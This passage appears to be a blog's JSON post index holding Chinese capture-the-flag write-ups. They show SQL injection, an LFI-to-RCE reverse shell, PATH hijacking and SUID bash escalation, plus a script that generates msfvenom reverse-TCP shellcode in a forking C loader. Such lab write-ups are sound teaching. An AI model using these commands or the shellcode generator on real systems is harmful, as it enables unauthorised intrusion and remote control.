shell\u540e\u95e8'\u3002\n\n   ```bash\n   echo@Sysadmin:~$ echo '#!/bin/bash' > df\n   echo@Sysadmin:~$ echo 'chmod +s /bin/bash' >> df\n   echo@Sysadmin:~$ chmod +x df\n   ```\n\n2. \u63a5\u7740\uff0c\u4fee\u6539 `PATH` \u73af\u5883\u53d8\u91cf\uff0c\u5c06\u5f53\u524d\u76ee\u5f55\uff08`.`\uff09\u6dfb\u52a0\u5230\u5176\u6700\u524d\u7aef\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5f53\u7cfb\u7edf\u67e5\u627e `df` \u547d\u4ee4\u65f6\uff0c\u4f1a\u4f18\u5148\u5728\u6211\u4eec\u521b\u5efa\u7684\u6076\u610f\u811a\u672c\u6240\u5728\u76ee\u5f55\u4e2d\u627e\u5230\u5e76\u6267\u884c\u5b83\u3002\n\n   ```bash\n   echo@Sysadmin:~$ export PATH=.:$PATH\n   ```\n\n3. \u4e07\u4e8b\u4ff1\u5907\uff0c\u4ee5 `root` \u6743\u9650\u6267\u884c\u76ee\u6807\u811a\u672c\uff0c\u89e6\u53d1\u6211\u4eec\u7684Payload\u3002\n\n   ```bash\n   echo@Sysadmin:~$ sudo -u root /usr/local/bin/system-info.sh\n   ```\n\n   \u811a\u672c\u5728\u6267\u884c\u5230 `df -h` \u65f6\uff0c\u4f1a\u8c03\u7528\u6211\u4eec\u4f2a\u9020\u7684 `df` \u7a0b\u5e8f\uff0c\u4ece\u800c\u4ee5 `root` \u6743\u9650\u6267\u884c\u4e86 `chmod +s /bin/bash`\u3002\n\n4. \u9a8c\u8bc1 `/bin/bash` \u7684\u6743\u9650\uff0c\u786e\u8ba4SUID\u4f4d\u662f\u5426\u5df2\u6210\u529f\u8bbe\u7f6e\u3002\n\n   ```bash\n   echo@Sysadmin:~$ ls -al /bin/bash\n   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n   ```\n\n   \u6743\u9650\u4f4d\u4e2d\u7684 `s` \u660e\u786e\u8868\u793aSUID\u4f4d\u8bbe\u7f6e\u6210\u529f\u3002\n\n5. \u6700\u540e\uff0c\u5229\u7528\u8fd9\u4e2a\u5e26\u6709SUID\u6743\u9650\u7684 `bash` \u6765\u83b7\u53d6 `root` Shell\u3002`-p` \u53c2\u6570\u7528\u4e8e\u786e\u4fdd`bash`\u5728\u542f\u52a8\u65f6\u4e0d\u4f1a\u56e0\u4e3a\u5b89\u5168\u539f\u56e0\u653e\u5f03\u7531SUID\u83b7\u5f97\u7684\u6709\u6548\u7528\u6237ID\uff08EUID\uff09\u3002\n\n   ```bash\n   echo@Sysadmin:~$ bash -p\n   bash-5.0# id\n   uid=1000(echo) gid=1000(echo) euid=0(root) egid=0(root) groups=0(root),1000(echo)\n   ```\n\n   `euid=0(root)` \u7684\u8f93\u51fa\u786e\u8ba4\u6211\u4eec\u5df2\u6210\u529f\u63d0\u6743\u81f3 `root` \u7528\u6237\u3002\n\n## **4. \u83b7\u53d6Flag**\n\n\u6210\u529f\u83b7\u5f97\u6700\u9ad8\u6743\u9650\u540e\uff0c\u8bfb\u53d6\u5e76\u63d0\u4ea4\u6240\u6709\u7684flag\u6587\u4ef6\u3002\n\n```bash\nbash-5.0# cat /root/root.txt /home/echo/user.txt\nflag{root-8b8a8b353298f798e3eb8628661617b6}\nflag{user-9592f6e02a7abaf9e38c0ef43e868cf3}\n```\n\n\u6e17\u900f\u6d4b\u8bd5\u81f3\u6b64\u987a\u5229\u5b8c\u6210\u3002\n\n# Sublarge\u601d\u8def\n\n**Sublarge Payload (`a.sh`):**\n\n```c\n#!/usr/bin/env bash\nLHOST='192.168.56.10'\nLPORT='4444'\nOUT_C='test.c'\n\n# 1. \u751f\u6210\u539f\u59cb shellcode\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n         LHOST='$LHOST' LPORT='$LPORT' \\\n         -f raw 2>/dev/null > /tmp/rev.raw\n[[ -s /tmp/rev.raw ]] || { echo '[-] msfvenom failed'; exit 1; }\n\n# 2. \u7528\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\nSC_HEX=$(xxd -p -c 1 /tmp/rev.raw | sed 's/^/0x/' | paste -sd',' -)\n\n# 3. \u5199 C \u6587\u4ef6\uff1a\u5b50\u8fdb\u7a0b\u540e\u53f0\u6267\u884c\ncat > '$OUT_C' <<EOF\nint fork(void);\nint execve(const char *p,char *const a[],char *const e[]);\n\nint main(void)\n{\n    if (fork() == 0) {\n        unsigned char sc[] = {$SC_HEX};\n        ((void(*)())sc)();\n    }\n    return 0;\n}\nEOF\n\necho '[+] Generated $OUT_C (forked)'\n```\n\n**\u6267\u884c\u6b65\u9aa4\uff1a**\n\n1. \u8fd0\u884ca.sh\n2. \u5c06\u751f\u6210\u7684test.c\u4e0a\u4f20\u5230\u670d\u52a1\u5668\n3. \u76d1\u542csentence", "top": 0, "createdAt": 1755307557, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-16", "dateLabelColor": "#0969da"}, "P217": {"htmlDir": "docs/post/thl_BackToTheFutureI.html", "labels": ["thehackerlabs"], "postTitle": "thl_BackToTheFutureI", "postUrl": "post/thl_BackToTheFutureI.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/217", "commentNum": 0, "wordCount": 7623, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1.1 \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u4f7f\u7528`arp-scan`\u5de5\u5177\u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u5bfb\u627e\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.142 08:00:27:b0:b9:32       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.142`\u3002\n\n## 1.2 \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528`nmap`\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u786e\u5b9a\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.142\n...\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u4e3b\u673a\u5f00\u653e\u4e86FTP(21)\u3001SSH(22)\u3001HTTP(80)\u548cMySQL(3306)\u56db\u4e2a\u7aef\u53e3\u3002\n\n#### 1.3 \u670d\u52a1\u63a2\u6d4b\n\n\u9010\u4e00\u6392\u67e5\u5df2\u53d1\u73b0\u7684\u670d\u52a1\uff1a\n\n*   **FTP (21)**: \u5c1d\u8bd5\u533f\u540d\u767b\u5f55\uff0c\u88ab\u62d2\u7edd\u3002\n*   **SSH (22)**: \u5c1d\u8bd5\u4f7f\u7528`hydra`\u8fdb\u884c\u5bc6\u7801\u7206\u7834\uff0c\u88ab\u76ee\u6807\u670d\u52a1\u5668\u62d2\u7edd\uff0c\u9519\u8bef\u4fe1\u606f\u663e\u793a\u4e0d\u652f\u6301\u5bc6\u7801\u8ba4\u8bc1\uff0c\u8fd9\u6697\u793a\u9700\u8981\u4f7f\u7528\u5bc6\u94a5\u767b\u5f55\u3002\n*   **MySQL (3306)**: \u5c1d\u8bd5\u4f7f\u7528`root`\u7528\u6237\u8fdc\u7a0b\u8fde\u63a5\uff0c\u88ab\u62d2\u7edd\uff0c\u9519\u8bef\u4fe1\u606f\u663e\u793a\u653b\u51fb\u673aIP\u4e0d\u5728\u5141\u8bb8\u8fde\u63a5\u7684\u5217\u8868\u4e2d\u3002\n*   **HTTP (80)**: \u8bbf\u95ee80\u7aef\u53e3\uff0c\u9875\u9762\u81ea\u52a8\u8df3\u8f6c\u5230\u57df\u540d `hillvalley.thl`\u3002\n\n# \u4e8c\u3001Web\u6e17\u900f\n\n## 2.1 \u57df\u540d\u914d\u7f6e\u4e0e\u4fe1\u606f\u53d1\u6398\n\n\u6839\u636e\u8df3\u8f6c\u4fe1\u606f\uff0c\u7f16\u8f91\u672c\u5730`/etc/hosts`\u6587\u4ef6\uff0c\u5c06\u57df\u540d`hillvalley.thl`\u6307\u5411\u76ee\u6807IP\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tail -n 1 /etc/hosts                                                                                 \n192.168.205.142 hillvalley.thl\n```\n\n\u8bbf\u95ee`http://hillvalley.thl`\uff0c\u53d1\u73b0\u4e00\u4e2a\u4ee5\u201c\u65f6\u95f4\u65c5\u884c\u65e5\u5fd7\u201d\u4e3a\u4e3b\u9898\u7684\u767b\u5f55\u9875\u9762\u3002\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u4e00\u6761\u6709\u8da3\u7684\u897f\u73ed\u7259\u8bed\u6ce8\u91ca\uff1a`<!-- \u00a1El reloj de la torre no tiene nada que ver! \u00bfO s\u00ed? -->` (\u949f\u697c\u8ddf\u8fd9\u4e8b\u6ca1\u5173\u7cfb\uff01\u771f\u7684\u5417\uff1f)\uff0c\u8fd9\u662f\u9776\u673a\u4e3b\u9898\u7684\u6697\u793a\u3002\n\n## 2.2 SQL\u6ce8\u5165\u6f0f\u6d1e\u5229\u7528\n\n\u9762\u5bf9\u767b\u5f55\u6846\uff0c\u9996\u5148\u5c1d\u8bd5\u8fdb\u884cSQL\u6ce8\u5165\u3002\u4f7f\u7528`sqlmap`\u5de5\u5177\u81ea\u52a8\u5316\u68c0\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -u 'http://hillvalley.thl/' --batch --forms\n...\nParameter: username (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n...\n```\n\n`sqlmap`\u786e\u8ba4\u4e86`username`\u53c2\u6570\u5b58\u5728\u57fa\u4e8e\u65f6\u95f4\u7684SQL\u76f2\u6ce8\u3002\u968f\u540e\uff0c\u5229\u7528\u6b64\u6f0f\u6d1edump\u6570\u636e\u5e93\u4fe1\u606f\u3002\n\n```bash\n# \u83b7\u53d6\u6570\u636e\u5e93\nsqlmap -u 'http://hillvalley.thl/' --batch --forms --dbs\n# ...\n[*] hillvalley\n[*] information_schema\n\n# \u83b7\u53d6\u8868\nsqlmap -u 'http://hillvalley.thl/' --batch --forms -D hillvalley --tables\n# ...\n+-------+\n| users |\n+-------+\n\n# dump\u6570\u636e\nsqlmap -u 'http://hillvalley.thl/' --batch --forms -D hillvalley -T users --dump\n# ...\n+----+--------------------------------------------------------------+----------+\n| id | password                                                     | username |\n+----+--------------------------------------------------------------+----------+\n| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |\n+----+--------------------------------------------------------------+----------+\n```\n\n\u6210\u529f\u83b7\u53d6\u5230\u7528\u6237`marty`\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\n\n## 2.3 \u54c8\u5e0c\u7834\u89e3\n\n\u4f7f\u7528`John the Ripper`\u548c`rockyou.txt`\u5b57\u5178\u5bf9\u83b7\u53d6\u7684bcrypt\u54c8\u5e0c\u8fdb\u884c\u7834\u89e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' > hash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n...\nandromeda        (?)     \n...\n```\n\n\u7834\u89e3\u5f97\u5230\u5bc6\u7801\u4e3a`andromeda`\u3002\n\n# \u4e09\u3001\u521d\u59cb\u8bbf\u95ee (Initial Access)\n\n## 3.1 \u6f0f\u6d1e\u7ec4\u5408\u83b7\u53d6Webshell\n\n\u5c1d\u8bd5\u4f7f\u7528`marty:andromeda`\u901a\u8fc7SSH\u767b\u5f55\uff0c\u4f46\u56e0\u670d\u52a1\u5668\u914d\u7f6e\u4e3a\u516c\u94a5\u8ba4\u8bc1\u800c\u5931\u8d25\u3002\n\n\u56de\u5230Web\u5e94\u7528\uff0c\u4f7f\u7528\u7834\u89e3\u7684\u51ed\u636e`marty:andromeda`\u6210\u529f\u767b\u5f55\u540e\u53f0\u3002\u767b\u5f55\u540e\u53d1\u73b0URL\u7ed3\u6784\u4e3a`http://hillvalley.thl/admin.php?page=about.php`\uff0c\u8fd9\u6781\u6709\u53ef\u80fd\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff08LFI\uff09\u6f0f\u6d1e\u3002\n\n\u5c1d\u8bd5\u8bfb\u53d6`/etc/passwd`\u6587\u4ef6\uff1a\n\n```\nhttp://hillvalley.thl/admin.php?page=../../../../etc/passwd\n```\n\n\u9875\u9762\u6210\u529f\u56de\u663e\u4e86\u6587\u4ef6\u5185\u5bb9\uff0c\u8bc1\u5b9e\u4e86LFI\u6f0f\u6d1e\u7684\u5b58\u5728\u3002\u63a5\u4e0b\u6765\uff0c\u5229\u7528`php://filter`\u914d\u5408`php_filter_chain_generator`\u5de5\u5177\u751f\u6210payload\uff0c\u7ed5\u8fc7\u9650\u5236\u6267\u884cPHP\u4ee3\u7801\u3002\n\n> **\u77e5\u8bc6\u70b9\u8865\u5145**: `php://filter`\u662fPHP\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u5c01\u88c5\u534f\u8bae\uff0c\u5b83\u5141\u8bb8\u5728\u8bfb\u53d6\u6587\u4ef6\u65f6\u5bf9\u5176\u5185\u5bb9\u8fdb\u884c\u8fc7\u6ee4\u548c\u5904\u7406\u3002`php_filter_chain_generator`\u5de5\u5177\u53ef\u4ee5\u751f\u6210\u4e00\u7cfb\u5217\u590d\u6742\u7684`iconv`\u7f16\u7801\u8f6c\u6362\u94fe\uff0c\u5229\u7528\u7279\u5b9aPHP\u7248\u672c\u4e2d\u7684bug\uff0c\u6700\u7ec8\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\n>\n> **\u5de5\u5177\u94fe\u63a5**:https://github.com/synacktiv/php_filter_chain_generator\n\n\u6210\u529f\u751f\u6210\u53cd\u5f39shell\u7684payload\u5e76\u6267\u884c\uff0c\u5728\u672c\u5730Kali\u4e0a\u4f7f\u7528`nc`\u76d1\u542c\uff0c\u83b7\u5f97\u4e86`www-data`\u7528\u6237\u7684shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]\n\u2514\u2500$ nc -lvnp 8888                 \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 45106\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# \u56db\u3001\u6743\u9650\u63d0\u5347 (Privilege Escalation)\n\n## 4.1 \u6a2a\u5411\u79fb\u52a8\uff1awww-data -> marty\n\n\u5728`www-data`\u7684shell\u4e2d\uff0c\u67e5\u770bWeb\u76ee\u5f55\u4e0b\u7684`config.php`\u6587\u4ef6\uff0c\u53d1\u73b0\u4e86\u6570\u636e\u5e93\u7684\u786c\u7f16\u7801\u51ed\u636e\u3002\n\n```bash\nwww-data@hillvalley:/var/www/project/app$ cat config.php \n<?php\n$host = 'localhost';\n$user = 'marty';\n$pass = 't1m3travel';\n$db = 'hillvalley';\n...\n?>\n```\n\n\u53d1\u73b0\u7528\u6237`marty`\u7684\u53e6\u4e00\u4e2a\u5bc6\u7801`t1m3travel`\u3002\u4f7f\u7528\u6b64\u5bc6\u7801\u6210\u529f\u4ece`www-data`\u5207\u6362\u5230`marty`\u7528\u6237\u3002\n\n```bash\nwww-data@hillvalley:/var/www/project/app$ su marty\nPassword: \nmarty@hillvalley:/var/www/project/app$ id\nuid=1001(marty) gid=1001(marty) groups=1001(marty)\n```\n\n\u5728`marty`\u7684\u4e3b\u76ee\u5f55\u4e0b\uff0c\u627e\u5230\u5e76\u8bfb\u53d6\u4e86`user.txt`\uff0c\u83b7\u5f97\u7b2c\u4e00\u4e2aflag\u3002\n\n## 4.2 \u6a2a\u5411\u79fb\u52a8\uff1amarty -> docbrown\n\n\u4f5c\u4e3a`marty`\u7528\u6237\uff0c\u5f00\u59cb\u5bfb\u627e\u8fdb\u4e00\u6b65\u63d0\u6743\u7684\u65b9\u6cd5\u3002`sudo -l`\u663e\u793a\u6ca1\u6709sudo\u6743\u9650\u3002\u5728\u4e3b\u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u5c5e\u4e8e`docbrown`\u7528\u6237\u7684\u7b14\u8bb0\u6587\u4ef6`.flux_notes`\uff0c\u5185\u5bb9\u4e3a`Tiempos inestables... a\u00fan necesito arreglar el runner para la pr\u00f3xima prueba.` (\u4e0d\u7a33\u5b9a\u7684\u65f6\u671f... \u6211\u4ecd\u7136\u9700\u8981\u4e3a\u4e0b\u4e00\u6b21\u6d4b\u8bd5\u4fee\u590drunner\u3002)\uff0c\u6697\u793a\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a'runner'\u7684\u7a0b\u5e8f\u3002\n\n\u4f7f\u7528`getcap`\u547d\u4ee4\u68c0\u67e5\u7cfb\u7edf\u6587\u4ef6\u7684Linux Capabilities\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5173\u952e\u914d\u7f6e\uff1a\n\n```bash\nmarty@hillvalley:~$ getcap -r / 2>/dev/null\n/usr/local/bin/backup_runner cap_setuid=ep\n...\n```\n\n> **\u77e5\u8bc6\u70b9\u8865\u5145**: Linux Capabilities\u5c06root\u7528\u6237\u7684\u7279\u6743\u5206\u89e3\u4e3a\u66f4\u5c0f\u7684\u5355\u5143\u3002`cap_setuid=ep`\u8868\u793a`/usr/local/bin/backup_runner`\u8fd9\u4e2a\u7a0b\u5e8f\u62e5\u6709\u4efb\u610f\u8bbe\u7f6e\u8fdb\u7a0bUID\u7684\u80fd\u529b\uff0c\u8fd9\u662f\u975e\u5e38\u5f3a\u5927\u7684\u6743\u9650\u3002\n\n\u4f7f\u7528`strings`\u547d\u4ee4\u5206\u6790`backup_runner`\uff0c\u53d1\u73b0\u5b83\u4f1a\u8c03\u7528`tar`\u547d\u4ee4\uff0c\u5e76\u4e14\u6ca1\u6709\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u3002\n\n```bash\nmarty@hillvalley:~$ strings /usr/local/bin/backup_runner\n...\nUsage: backup_runner <filename>\ntar czf /tmp/%s-backup.tar.gz /home/docbrown/docs\n...\n```\n\n\u8fd9\u6784\u6210\u4e86\u4e00\u4e2a\u5178\u578b\u7684`$PATH`\u52ab\u6301\u6f0f\u6d1e\u3002\u901a\u8fc7\u5728`/tmp`\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684`tar`\u811a\u672c\uff0c\u5e76\u5c06\u5176\u8def\u5f84\u6dfb\u52a0\u5230`$PATH`\u73af\u5883\u53d8\u91cf\u7684\u6700\u524d\u9762\uff0c\u53ef\u4ee5\u52ab\u6301`backup_runner`\u7684\u6267\u884c\u6d41\u3002\n\n```bash\nmarty@hillvalley:~$ cd /tmp\nmarty@hillvalley:/tmp$ echo '#!/bin/bash' > tar\nmarty@hillvalley:/tmp$ echo '/bin/bash -p' >> tar\nmarty@hillvalley:/tmp$ chmod +x tar\nmarty@hillvalley:/tmp$ export PATH=/tmp:$PATH\nmarty@hillvalley:/tmp$ /usr/local/bin/backup_runner x\ndocbrown@hillvalley:/tmp$ id\nuid=1000(docbrown) gid=1001(marty) groups=1001(marty)\n```\n\n\u6267\u884c\u540e\uff0c\u6210\u529f\u5207\u6362\u4e3a`docbrown`\u7528\u6237\u3002\n\n## 4.3 \u6700\u7ec8\u63d0\u6743\uff1adocbrown -> root\n\n\u4f5c\u4e3a`docbrown`\u7528\u6237\uff0c\u518d\u6b21\u6267\u884c`sudo -l`\u68c0\u67e5\u6743\u9650\u3002\n\n```bash\ndocbrown@hillvalley:/tmp$ sudo -l\n...\nUser docbrown may run the following commands on hillvaley:\n    (root) NOPASSWD: /usr/local/bin/time_daemon\n```\n\n\u53d1\u73b0`docbrown`\u53ef\u4ee5\u514d\u5bc6\u4ee5`root`\u8eab\u4efd\u8fd0\u884c`/usr/local/bin/time_daemon`\u3002\u5c1d\u8bd5\u6267\u884c\u8be5\u7a0b\u5e8f\uff0c\u5f97\u5230\u62a5\u9519\u4fe1\u606f\uff1a\n\n```bash\ndocbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon\n[FLUX] No existe el archivo /tmp/sync: No such file or directory\n```\n\n\u7a0b\u5e8f\u8bd5\u56fe\u8bbf\u95ee`/tmp/sync`\u6587\u4ef6\u3002\u8fd9\u4e0e\u4e4b\u524d\u5728`marty`\u7528\u6237\u4e0b\u53d1\u73b0\u7684`crontab`\u6761\u76ee\u8054\u7cfb\u4e86\u8d77\u6765\uff1a\n\n```bash\nmarty@hillvalley:~$ cat /etc/crontab\n...\n* * * * * root /usr/local/bin/flux_admin.sh\nmarty@hillvalley:~$ ls -al /usr/local/bin/flux_admin.sh\nls: cannot access '/usr/local/bin/flux_admin.sh': No such file or directory\nmarty@hillvalley:~$ ls -al /usr/local/bin/\ntotal 40\ndrwxr-xr-x  2 root root  4096 Jul 14 21:53 .\ndrwxr-xr-x 10 root root  4096 Jul 11 21:56 ..\n-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner\n-rwx------  1 root root 16296 Jul 14 20:44 time_daemon\n```\n\n\u5b9a\u65f6\u4efb\u52a1\u6bcf\u5206\u949f\u90fd\u4ee5`root`\u6743\u9650\u6267\u884c\u4e00\u4e2a\u5f53\u65f6\u8fd8\u4e0d\u5b58\u5728\u7684\u811a\u672c`/usr/local/bin/flux_admin.sh`\u3002\u8fd9\u91cc\u7684\u63d0\u6743\u601d\u8def\u662f\uff1a\u731c\u6d4b`time_daemon`\u4f1a\u590d\u5236`/tmp/sync`\u53bb`flux_admin.sh`\n\n1. **\u521b\u5efaPayload**\uff1a\u5728`/tmp`\u76ee\u5f55\u4e0b\u521b\u5efa`sync`\u6587\u4ef6\uff0c\u5185\u5bb9\u662f\u6211\u4eec\u7684\u63d0\u6743\u547d\u4ee4\u3002\n\n```bash\ndocbrown@hillvalley:/home/docbrown$ echo '#!/bin/bash' > /tmp/sync\ndocbrown@hillvalley:/home/docbrown$ echo 'chmod +s /bin/bash' >> /tmp/sync\n    docbrown@hillvalley:/home/docbrown$ chmod +x /tmp/sync\n```\n\n2. **\u89e6\u53d1\u6587\u4ef6\u5199\u5165**\uff1a\u4ee5`root`\u6743\u9650\u6267\u884c`time_daemon`\u3002\u8be5\u7a0b\u5e8f\u4f1a\u8bfb\u53d6`/tmp/sync`\u7684\u5185\u5bb9\uff0c\u5e76\u5c06\u5176\u5199\u5165\u5230`/usr/local/bin/flux_admin.sh`\u4e2d\u3002\n\n   ```bash\n   docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon\n   [88MPH] Sincronizaci\u00f3n completada. Listo para viajar.\n   ```\n\n3. **\u7b49\u5f85Cron Job\u6267\u884c**\uff1a\u7b49\u5f85\u6700\u591a\u4e00\u5206\u949f\uff0c`crontab`\u4e2d\u7684\u5b9a\u65f6\u4efb\u52a1\u4f1a\u81ea\u52a8\u4ee5`root`\u6743\u9650\u6267\u884c`/usr/local/bin/flux_admin.sh`\uff0c\u4ece\u800c\u4e3a`/bin/bash`\u6dfb\u52a0SUID\u6743\u9650\u4f4d\u3002\n\n4. **\u83b7\u53d6Root Shell**\uff1a\u68c0\u67e5`/bin/bash`\u6743\u9650\uff0c\u786e\u8ba4SUID\u4f4d\u5df2\u8bbe\u7f6e\u540e\uff0c\u6267\u884c`bash -p`\u83b7\u53d6root\u6743\u9650\u3002\n\n   ```bash\n   docbrown@hillvalley:/home/docbrown$ ls -al /bin/bash\n   -rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash\n   docbrown@hillvalley:/home/docbrown$ bash -p\n   bash-5.2# id\n   uid=1000(docbrown) gid=1001(marty) euid=0(root) egid=0(root) groups=0(root),1001(marty)\n   ```\n\n5. **\u8bfb\u53d6\u6700\u7ec8Flag**\uff1a\n\n   ```bash\n   bash-5.2# cat /root/root.txt /home/marty/user.txt \n   FLAG{1.21_gigawatts_of_root_power}\n   FLAG{D3_L0r34n}\n   ```\n\n\u6210\u529f\u63d0\u6743\u81f3`root`\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1755321082, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-16", "dateLabelColor": "#0969da"}, "P218": {"htmlDir": "docs/post/thl_ElCandidato.html", "labels": ["thehackerlabs"], "postTitle": "thl_ElCandidato", "postUrl": "post/thl_ElCandidato.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/218", "commentNum": 0, "wordCount": 10693, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u5728\u5f53\u524d\u7f51\u6bb5\u5185\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u3002\u4f7f\u7528`arp-scan`\u5de5\u5177\u626b\u63cf\u672c\u5730\u7f51\u7edc\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.131 08:00:27:71:8b:9b       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:e9:a7:63       VMware, Inc.\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.131`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u786e\u8ba4\u76ee\u6807IP\u540e\uff0c\u4f7f\u7528`nmap`\u5bf9\u76ee\u6807\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.131                           \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 21:52 EDT\nNmap scan report for 192.168.205.131\nHost is up (0.00021s latency).\nNot shown: 65527 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n80/tcp  open  http\n110/tcp open  pop3\n139/tcp open  netbios-ssn\n143/tcp open  imap\n445/tcp open  microsoft-ds\n993/tcp open  imaps\n995/tcp open  pop3s\nMAC Address: 08:00:27:71:8B:9B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.29 seconds\n```\n\n\u626b\u63cf\u53d1\u73b0\u76ee\u6807\u5f00\u653e\u4e86\u591a\u4e2a\u7aef\u53e3\uff0c\u5305\u62ec`22 (SSH)`\u3001`80 (HTTP)`\u3001`445 (SMB)`\u4ee5\u53ca\u591a\u4e2a\u90ae\u4ef6\u670d\u52a1\u7aef\u53e3\u3002\u6211\u4eec\u9996\u5148\u4ece\u6700\u5bb9\u6613\u83b7\u53d6\u4fe1\u606f\u7684HTTP\u670d\u52a1\u5165\u624b\u3002\n\n## 3. Web\u4fe1\u606f\u63a2\u6d4b\n\n\u8bbf\u95ee`http://192.168.205.131`\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u62db\u8058\u7f51\u7ad9\u3002\u5728\u6d4f\u89c8\u7f51\u7ad9\u5185\u5bb9\u65f6\uff0c\u6ce8\u610f\u5230\u5176\u94fe\u63a5\u6307\u5411\u4e86\u4e00\u4e2a\u57df\u540d `gyhabogados.thl`\u3002\u4e3a\u4e86\u65b9\u4fbf\u540e\u7eed\u7684\u63a2\u6d4b\uff0c\u5c06\u5176\u6dfb\u52a0\u5230\u672c\u5730`/etc/hosts`\u6587\u4ef6\u3002\n\n```bash\n# \u5c06\u4ee5\u4e0b\u884c\u6dfb\u52a0\u5230 /etc/hosts 